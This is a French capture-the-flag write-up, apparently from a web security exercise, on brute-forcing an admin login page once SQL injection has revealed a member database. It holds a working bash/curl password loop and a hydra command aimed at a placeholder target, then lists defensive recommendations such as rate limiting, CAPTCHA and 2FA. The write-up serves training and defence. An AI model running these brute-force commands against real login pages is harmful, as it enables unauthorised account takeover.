## **Brute Force - Page de Connexion**

### **Description**
Grâce à l’exploitation des failles **d’injection SQL** sur les pages `search member` et `search image`, une base de données nommée **Member Brute Force** a été découverte.
**Problème :** Même sans exploiter directement les identifiants via SQLi, un attaquant peut réaliser une **attaque par force brute** sur la page de connexion.

### **Exploitation**
- Un script tente automatiquement **plusieurs mots de passe courants** jusqu’à trouver le bon.
- Exemple d’approche :
  - Détection d’un formulaire de login (`/login.php`, `/admin`, etc.)
  - Utilisation d’une liste de mots de passe populaires
- Après plusieurs essais, le mot de passe de l’administrateur est trouvé, ce qui donne accès au panneau de gestion, et permet d’obtenir le **flag**.

### **Exemples d’exploitation**
- Script d’automatisation simple (ex: bash, Python, `hydra`, etc.)
```bash
for pass in $(cat top25.txt); do
    curl -s -X POST "http://target/login.php" -d "username=admin&password=$pass" | grep "Bienvenue" && echo "Trouvé : $pass"
done
```

- Outils spécialisés :
```bash
hydra -l admin -P top25.txt http-post-form "/login.php:username=^USER^&password=^PASS^:F=Login failed"
```

### **Cas d’usage**
- Obtenir l’accès à un compte administrateur.
- Prendre le contrôle du site ou accéder à des informations sensibles.

### **Recommandations**
- **Limiter le nombre de tentatives** par minute/IP.
- **Imposer un délai progressif** entre les tentatives échouées.
- **Mettre en place un CAPTCHA** après plusieurs échecs.
- **Utiliser l’authentification multi-facteur (2FA)**.
- **Forcer une politique de mot de passe fort.**
- **Analyser les logs** pour détecter les comportements suspects.
